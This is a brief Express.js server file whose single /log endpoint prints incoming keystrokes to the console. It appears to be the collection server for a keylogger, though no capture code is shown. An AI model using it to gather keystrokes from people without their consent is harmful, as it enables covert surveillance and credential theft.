import express from "express";

// Initialization
const app = express();

// Middleware
app.use(express.json());

// logging endpoint
app.post("/log", (req, res) => {
  console.log("Keystroke logged:", req.body.key);
  res.send();
});

const PORT = 2000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
